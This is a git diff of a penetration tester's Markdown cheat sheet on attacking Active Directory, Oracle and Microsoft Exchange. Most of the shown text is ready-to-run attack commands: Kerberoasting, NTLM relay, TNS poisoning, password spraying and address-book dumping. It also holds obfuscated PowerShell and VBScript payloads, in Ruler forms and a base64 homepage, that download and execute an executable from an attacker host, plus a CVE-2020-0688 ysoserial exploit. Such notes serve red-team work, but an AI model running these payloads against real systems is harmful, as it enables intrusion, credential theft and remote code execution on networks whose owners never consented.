@@ -626,7 +626,7 @@ PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serv
 ##### GetUserSPNs.py
 
 ```
-$ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
+$ GetUserSPNs.py MEGACORP/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 -save
 $ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
@@ -715,7 +715,7 @@ Check if the attacker "MEGACORP\sbauer" (`S-1-5-21-3167813660-1240564177-9187407
 PowerView3 > Get-DomainObjectAcl -Identity jorden -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.SecurityIdentifier -eq "S-1-5-21-3167813660-1240564177-918740779-3102"}
 ```
 
-Note:
+Notes:
 
 * PowerView 3.0 does not return `IdentityReference` property, which makes it less handy for this task (however, you may filter the output by the attacker's SID).
 * `-ResolveGUIDs` switch shows `ObjectType` and `InheritedObjectType` properties in a human form (not in GUIDs).
@@ -1017,7 +1017,7 @@ $ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.
 * [www.exploit-db.com/docs/48282](https://www.exploit-db.com/docs/48282)
 
 ```
-$ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs
+$ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs [-debug]
 $ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
 ```
 
@@ -1906,6 +1906,7 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\
 
 * [blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
 * [blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [www.secureauth.com/blog/playing-with-relayed-credentials/](https://www.secureauth.com/blog/playing-with-relayed-credentials/)
 * [intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
 * [www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/](https://www.sans.org/blog/smb-relay-demystified-and-ntlmv2-pwnage-with-python/)
 * [byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
@@ -1916,8 +1917,8 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\
 Generate relay list with cme and enumerate local admins when relaying
 
 ```
-$ crackmapexec smb 192.168.2.0/24 --gen-relay-list out.txt
-$ sudo ntlmrelayx.py -smb2support --no-http-server -tf out.txt --enum-local-admins
+$ cme smb 192.168.2.0/24 --gen-relay-list out.txt
+$ sudo ntlmrelayx.py -smb2support --no-http-server -tf out.txt --enum-local-admins -of net-ntlmv2
 ```
 
 
@@ -3054,22 +3055,30 @@ $ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 
 ## Oracle
 
+* [xakep.ru/2015/04/07/195-oracle-db/](https://xakep.ru/2015/04/07/195-oracle-db/)
+* [www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf](https://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf)
+* [book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener)
+* [www.red-database-security.com/wp/oracle_cheat.pdf](http://www.red-database-security.com/wp/oracle_cheat.pdf)
+
 
 
 ### TNS Poison
+
+* [www.joxeankoret.com/download/tnspoison.pdf](http://www.joxeankoret.com/download/tnspoison.pdf)
+* [www.youtube.com/watch?v=0IKltOBXiII](https://www.youtube.com/watch?v=0IKltOBXiII)
 
 
 #### Nmap
 
 ```
 $ sudo wget https://gist.githubusercontent.com/JukArkadiy/3d6cff222d1b87e963e7/raw/fbe6fe17a9bca6ce839544b7afb2276fff061d46/oracle-tns-poison.nse -O /usr/share/nmap/scripts/oracle-tns-poison.nse
-$ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 127.0.0.1
+$ sudo nmap -v -n -Pn -sV --script=oracle-tns-poison.nse -oA CVE-2014-0160/nmap/tns-poison -p1521 10.10.13.37
 ```
 
 
 #### odat
 
-Install:
+Install manually:
 
 * [github.com/quentinhardy/odat/releases](https://github.com/quentinhardy/odat/releases/)
 * [github.com/quentinhardy/odat#installation-optional-for-development-version](https://github.com/quentinhardy/odat#installation-optional-for-development-version)
@@ -3097,7 +3106,8 @@ Usage:
 * [github.com/quentinhardy/odat/wiki/tnspoison](https://github.com/quentinhardy/odat/wiki/tnspoison)
 
 ```
-$ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
+$ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --test-module
+$ python3 odat.py tnspoison -s 10.10.13.37 -d CLREXTPROC --poison
 ```
 
 
@@ -3240,6 +3250,14 @@ $ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
 $ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
 $ redis-cli -h 127.0.0.1 save
 ```
+
+
+
+
+
+# 1C
+
+* [t.me/webpwn/280](https://t.me/webpwn/280)
 
 
 
@@ -4443,7 +4461,7 @@ $ pipenv install -r requirements.txt && pipenv shell
 #### lookupsid.py
 
 ```
-$ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000 | tee ~/workspace/log/lookupsid.out
+$ lookupsid.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 20000 | tee ~/workspace/log/lookupsid.out
 $ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v '\$' | awk -F'\' '{print $2}' | awk '{print $1}' > ~/workspace/enum/allusers.txt
 ```
 
@@ -4645,7 +4663,7 @@ echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_P
 PowerShell auto detect proxy, download file from remote HTTP server and run it:
 
 ```
-$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
+$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.UseDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
 ```
 
 PowerShell manually set proxy and upload file to remote HTTP server:
@@ -4713,6 +4731,361 @@ PS > cd .\v4.0.30319\
 PS > Get-Item .\clr.dll | Fl
 Or
 PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll)).FileVersion
+```
+
+
+
+
+
+# Perimeter
+
+
+
+
+## Exchange
+
+* [swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
+
+
+
+### GAL
+
+
+#### Ruler
+
+```
+$ ./ruler -k -d megacorp.com -u snovvcrash -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose abk dump -o gal.txt
+```
+
+
+#### MailSniper
+
+```
+PS > Get-GlobalAddressList -ExchHostname mail.megacorp.com -UserName MEGACORP\snovvcrash -Password 'Passw0rd!' -OutFile gal.txt
+```
+
+
+#### OAB
+
+Search for `<OABUrl>` node using Burp:
+
+```
+POST /autodiscover/autodiscover.xml HTTP/1.1
+Host: mx.megacorp.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Authorization: Basic TUVHQUNPUlBcc25vdnZjcmFzaDpQYXNzdzByZCEK
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+Content-Length: 350
+
+<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+    <Request>
+      <EMailAddress>snovvcrash@megacorp.com</EMailAddress>
+      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+    </Request>
+</Autodiscover>
+```
+
+Or with a Python [script](https://gist.github.com/snovvcrash/4e76aaf2a8750922f546eed81aa51438):
+
+```
+$ ./oaburl.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -e 'existent.email@megacorp.com'
+[*] Authenticated users's SID (X-BackEndCookie): S-1-5-21-3167813660-1240564177-918740779-3102
+[+] DisplayName: Sam Freeside
+[+] Server: 00ff00ff-00ff-00ff-00ff-00ff00ff00ff@megacorp.com
+[+] AD: dc01.megacorp.com
+[+] OABUrl: https://mx.megacorp.com/OAB/<OABUrl>/
+```
+
+Get oab.xml and then gal.lzx:
+
+```
+$ curl -k --ntlm -u 'MEGACORP\snovvcrash:Passw0rd!' https://mx.megacorp.local/OAB/<OABUrl>/oab.xml > oab.xml
+$ cat oab.xml | grep '.lzx' | grep data
+$ curl -k --ntlm -u 'MEGACORP\snovvcrash:Passw0rd!' https://mx.megacorp.local/OAB/<OABUrl>/11ff11ff-11ff-11ff-11ff-11ff11ff11ff-data-999.lzx > gal.lzx
+```
+
+Install libmspack:
+
+```
+$ git clone https://github.com/kyz/libmspack ~/tools/libmspack && cd ~/tools/libmspack/libmspack
+$ sudo apt install autoconf libtool -y
+$ ./rebuild.sh && ./configure && make && cd -
+```
+
+Parse gal.lzx into gal.oab and extract emails from gal.oab with a regexp:
+
+```
+$ ~/tools/libmspack/libmspack/examples/oabextract gal.lzx gal.oab
+$ strings gal.oab | egrep -o "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}" | sort -u > emails.txt
+```
+
+
+
+### ActiveSync
+
+
+#### PEAS
+
+* [labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
+* [labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/](https://labs.f-secure.com/tools/peas-access-internal-fileshares-through-exchange-activesync/)
+* [github.com/FSecureLABS/peas](https://github.com/FSecureLABS/peas)
+* [github.com/snovvcrash/peas](https://github.com/snovvcrash/peas)
+
+Install:
+
+```
+$ git clone https://github.com/snovvcrash/peas ~/tools/peas-m && cd ~/tools/peas-m
+$ python3 -m virtualenv --python=/usr/bin/python venv && source venv/bin/activate
+(venv) $ pip install --upgrade 'setuptools<45.0.0'
+(venv) $ pip install -r requirements.txt
+```
+
+Run:
+
+```
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --check
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --list-unc='\\DC01'
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --list-unc='\\DC01\SYSVOL\megacorp.com'
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --dl-unc='\\DC01\share\file.txt'
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --dl-unc='\\DC01\share\file.txt' -o file.txt
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --crawl-unc='\\DC01\share\' [--pattern xml,ini] [--download]
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --brute-unc [--prefix srv]
+```
+
+
+#### How-To
+
+1\. Use Nmap `http-ntlm-info` to get NetBIOS domain name and Exchange hostname: hunting for hostname pattern prefix if there is one.
+
+2\. Locate DC (guess it trying hostname pattern prefix) and mirror `\\DC01\SYSVOL\megacorp.local\` share with `--crawl-unc` function:
+
+```
+$ python -m peas -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com --crawl-unc='\\DC01\SYSVOL\megacorp.com\' --download
+```
+
+3\. Find, xargs and grep for keywords in files: `password`, NetBIOS domain name (for additional account names), hostname pattern prefix (for additional hosts/shares):
+
+```
+$ find . -type f -print0 | xargs -0 grep -v PolicyDefinitions | grep -i -e password -e pass
+$ find . -type f -print0 | xargs -0 grep -v PolicyDefinitions | grep -i <DOMAIN_NETBIOS_NAME>
+$ find . -type f -print0 | xargs -0 grep -v PolicyDefinitions | grep -i <PREFIX>
+```
+
+4\. (optional) Brute other share names:
+
+```
+$ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp.com [--prefix srv]
+```
+
+
+
+### Ruler
+
+* [github.com/sensepost/ruler/releases](https://github.com/sensepost/ruler/releases)
+
+
+#### Rules
+
+* [github.com/sensepost/ruler/wiki/Rules](https://github.com/sensepost/ruler/wiki/Rules)
+* [silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)
+
+
+#### Forms
+
+* [github.com/sensepost/ruler/wiki/Forms](https://github.com/sensepost/ruler/wiki/Forms)
+* [sensepost.com/blog/2017/outlook-forms-and-shells/](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
+
+Display forms:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form display
+```
+
+Exploit:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form add --suffix test-form --input vbs-payload.txt --send
+```
+
+```(vbs-payload.txt)
+CreateObject("WScript.Shell").Run "powershell -exec bypass -enc JABwAHIAbwB4AHkAQQBkAGQAcgA9ACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwASQBuAHQAZQByAG4AZQB0ACAAUwBlAHQAdABpAG4AZwBzACIAKQAuAFAAcgBvAHgAeQBTAGUAcgB2AGUAcgA7ACQAcAByAG8AeAB5AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAOwAkAHAAcgBvAHgAeQAuAEEAZABkAHIAZQBzAHMAPQAkAHAAcgBvAHgAeQBBAGQAZAByADsAJABwAHIAbwB4AHkALgBVAHMAZQBEAGUAZgBhAHUAbAB0AEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA9ACQAdAByAHUAZQA7ACQAYwBsAGkAZQBuAHQAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAFAAcgBvAHgAeQA9ACQAcAByAG8AeAB5ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMwAuADMANwAvAGgAdAB0AHAAcwA0ADQAMwAuAGUAeABlACIALAAiACQAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUAXABtAHUAcwBpAGMAXABoAHQAdABwAHMANAA0ADMALgBlAHgAZQAiACkAOwAkAGUAeABlAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBjAG8AbQAgAHMAaABlAGwAbAAuAGEAcABwAGwAaQBjAGEAdABpAG8AbgA7ACQAZQB4AGUAYwAuAHMAaABlAGwAbABlAHgAZQBjAHUAdABlACgAIgAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlAFwAbQB1AHMAaQBjAFwAaAB0AHQAcABzADQANAAzAC4AZQB4AGUAIgApAAoA", 0, false
+```
+
+Cleanup:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form delete --suffix test-form
+```
+
+Empire stager encryption:
+
+```
+$ grep -e output_type -e payload_type -e clean_output -e userdomain genetic.config
+    output_type = GO
+    payload_type = DLL_x64
+    clean_output = True
+        userdomain = 'MEGACORP'
+$ python ebowla.py https443.dll genetic.config
+$ ./build_x64_go.sh output/go_symmetric_https443.dll.go https443.exe --hidden
+```
+
+
+#### Homepage
+
+* [github.com/sensepost/ruler/wiki/Homepage](https://github.com/sensepost/ruler/wiki/Homepage)
+* [sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
+
+Exploit:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage add --url http://10.10.13.37/homepage.html
+```
+
+```(homepage.html.b64)
+PGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+Cjx0aXRsZT5PdXRsb29rPC90aXRsZT4KPHNjcmlwdCBpZD1jbGllbnRFdmVudEhhbmRsZXJzVkJTIGxhbmd1YWdlPXZic2NyaXB0Pgo8IS0tCiBTdWIgd2luZG93X29ubG9hZCgpCiAgICAgU2V0IEFwcGxpY2F0aW9uID0gVmlld0N0bDEuT3V0bG9va0FwcGxpY2F0aW9uCiAgICAgU2V0IGNtZCA9IEFwcGxpY2F0aW9uLkNyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpCiAgICAgY21kLlJ1bigicG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWUgSkFCd0FISUFid0I0QUhrQVFRQmtBR1FBY2dBOUFDZ0FSd0JsQUhRQUxRQkpBSFFBWlFCdEFGQUFjZ0J2QUhBQVpRQnlBSFFBZVFBZ0FDSUFTQUJMQUVNQVZRQTZBRndBVXdCdkFHWUFkQUIzQUdFQWNnQmxBRndBVFFCcEFHTUFjZ0J2QUhNQWJ3Qm1BSFFBWEFCWEFHa0FiZ0JrQUc4QWR3QnpBRndBUXdCMUFISUFjZ0JsQUc0QWRBQldBR1VBY2dCekFHa0Fid0J1QUZ3QVNRQnVBSFFBWlFCeUFHNEFaUUIwQUNBQVV3QmxBSFFBZEFCcEFHNEFad0J6QUNJQUtRQXVBRkFBY2dCdkFIZ0FlUUJUQUdVQWNnQjJBR1VBY2dBN0FDUUFjQUJ5QUc4QWVBQjVBRDBBVGdCbEFIY0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVGdCbEFIUUFMZ0JYQUdVQVlnQlFBSElBYndCNEFIa0FPd0FrQUhBQWNnQnZBSGdBZVFBdUFFRUFaQUJrQUhJQVpRQnpBSE1BUFFBa0FIQUFjZ0J2QUhnQWVRQkJBR1FBWkFCeUFEc0FKQUJ3QUhJQWJ3QjRBSGtBTGdCVkFITUFaUUJFQUdVQVpnQmhBSFVBYkFCMEFFTUFjZ0JsQUdRQVpRQnVBSFFBYVFCaEFHd0Fjd0E5QUNRQWRBQnlBSFVBWlFBN0FDUUFZd0JzQUdrQVpRQnVBSFFBUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUZBQWNnQnZBSGdBZVFBOUFDUUFjQUJ5QUc4QWVBQjVBRHNBSkFCakFHd0FhUUJsQUc0QWRBQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQkdBR2tBYkFCbEFDZ0FJZ0JvQUhRQWRBQndBRG9BTHdBdkFERUFNQUF1QURFQU1BQXVBREVBTXdBdUFETUFOd0F2QUhNQWRBQmhBR2NBWlFCeUFEWUFOQUF1QUdRQWJBQnNBQ0lBTEFBaUFDUUFaUUJ1QUhZQU9nQjFBSE1BWlFCeUFIQUFjZ0J2QUdZQWFRQnNBR1VBWEFCdEFIVUFjd0JwQUdNQVhBQnpBSFFBWVFCbkFHVUFjZ0EyQURRQUxnQmtBR3dBYkFBaUFDa0FPd0FrQUdVQWVBQmxBR01BUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFMUUJqQUc4QWJRQWdBSE1BYUFCbEFHd0FiQUF1QUdFQWNBQndBR3dBYVFCakFHRUFkQUJwQUc4QWJnQTdBQ1FBWlFCNEFHVUFZd0F1QUhNQWFBQmxBR3dBYkFCbEFIZ0FaUUJqQUhVQWRBQmxBQ2dBSWdCeUFIVUFiZ0JrQUd3QWJBQXpBRElBSWdBc0FDSUFKQUJsQUc0QWRnQTZBSFVBY3dCbEFISUFjQUJ5QUc4QVpnQnBBR3dBWlFCY0FHMEFkUUJ6QUdrQVl3QmNBSE1BZEFCaEFHY0FaUUJ5QURZQU5BQXVBR1FBYkFCc0FDSUFLUUFLQUE9PSIpCiBFbmQgU3ViCi0tPgoKPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgogPG9iamVjdCBjbGFzc2lkPSJjbHNpZDowMDA2RjA2My0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDYiIGlkPSJWaWV3Q3RsMSIgZGF0YT0iIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj48L29iamVjdD4KPC9ib2R5Pgo8L2h0bWw+Cg==
+```
+
+Cleanup:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage delete
+```
+
+Stager encryption is the same as for Ruler/Forms.
+
+
+
+### CVE-2020-0688
+
+* [www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
+* [github.com/pwntester/ysoserial.net/releases/latest](https://github.com/pwntester/ysoserial.net/releases/latest)
+
+```
+Get ViewStateUserKey: Browser → F12 → Storage → ASP.NET_SessionId
+Get ViewStateGenerator: Browser → F12 → Console → document.getElementById("__VIEWSTATEGENERATOR").value
+PS > [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$name = hostname;nslookup "$name.0000000000ffffffffff.d.zhack.ca"'))
+PS > .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec bypass -enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHAAbwBjAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAIgBDAFYARQAtADIAMAAyADAALQAwADYAOAA4ACAAQQBiAHUAcwBlACAAUABvAEMALgAuAC4AIgAKAA===" --validationalg "SHA1" --validationkey "CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --viewstateuserkey "<VIEWSTATE>" --generator "<GENERATOR>" --islegacy --isdebug
+https://mx.megacorp.com/ecp/default.aspx?__VIEWSTATEGENERATOR=<GENERATOR>&__VIEWSTATE=<VIEWSTATE>
+```
+
+
+
+### NSPI
+
+* [swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
+* [github.com/ptswarm/impacket](https://github.com/ptswarm/impacket)
+
+* `>= Impacket v0.9.22.dev1+20200819.170651.b5fa089b`
+
+List Address Books and count entities in every one of them:
+
+```
+$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi list-tables -count
+```
+
+Dump any specified Address Book by its name or GUID:
+
+```
+$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi dump-tables -guid 00ff00ff-00ff-00ff-00ff-00ff00ff00ff -lookup-type EXTENDED -output-file gal.txt
+$ cat gal.txt | grep 'mail,' | sort -u | awk -F' ' '{print $3}' > emails.txt
+```
+
+Return AD objects by their GUIDs:
+
+```
+PS > (Get-ADuser -Identity snovvcrash).ObjectGUID
+$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi guid-known -guid 00ff00ff-00ff-00ff-00ff-00ff00ff00ff -lookup-type FULL
+```
+
+Dump all AD records via requesting DNTs:
+
+```
+$ exchanger.py MEGACORP/snovvcrash:'Passw0rd!'@mx.megacorp.com -debug nspi dnt-lookup -lookup-type EXTENDED -start-dnt 0 -stop-dnt 500000 -output-file dnt-dump.txt
+```
+
+
+
+
+##  OWA
+
+
+
+### Enumerate Users
+
+* [www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/](https://www.triaxiomsecurity.com/2019/03/15/vulnerability-walkthrough-timing-based-username-enumeration/)
+* [www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen](https://www.intruder.io/blog/user-enumeration-in-microsoft-products-an-incident-waiting-to-happen)
+
+
+#### MailSniper
+
+```
+PS > Invoke-UsernameHarvestOWA -ExchHostname mx.megacorp.com -Domain MEGACORP -UserList .\owa-users.txt -Threads 25 -OutFile owa-valid-users.txt
+```
+
+
+
+### Password Spray
+
+
+#### Ruler
+
+* [github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials](https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials)
+
+Autodiscover URL implicit:
+
+```
+$ ./ruler -k -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-results-blood.txt
+```
+
+Autodiscover URL explicit:
+
+```
+$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com brute --users users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a ruler-results-all.txt
+```
+
+Notes:
+
+* In users.txt there's only "username" on a line, not "DOMAIN\username".
+* Errors like `ERROR: 04:27:43 brute.go:193: An error occured in connection - Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: Get https://autodiscover.megacorp.com/autodiscover/autodiscover.xml: net/http: request canceled` do **not** affect the current password probe.
+
+
+
+### Parse NTLM
+
+* [github.com/nyxgeek/ntlmscan](https://github.com/nyxgeek/ntlmscan)
+* [gist.github.com/aseering/829a2270b72345a1dc42](https://gist.github.com/aseering/829a2270b72345a1dc42)
+
+
+#### Nmap
+
+```
+$ sudo nmap --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 mx.megacorp.com
+```
+
+
+#### Metasploit
+
+```
+msf > use auxiliary/scanner/http/owa_login
+```
+
+
+#### MailSniper
+
+```
+PS > Invoke-DomainHarvestOWA -ExchHostname mx.megacorp.com
+```
+
+
+#### get_ad_domain.zip
+
+```
+$ python get_ad_domain.zip -m owa mx.megacorp.com
 ```
 
 
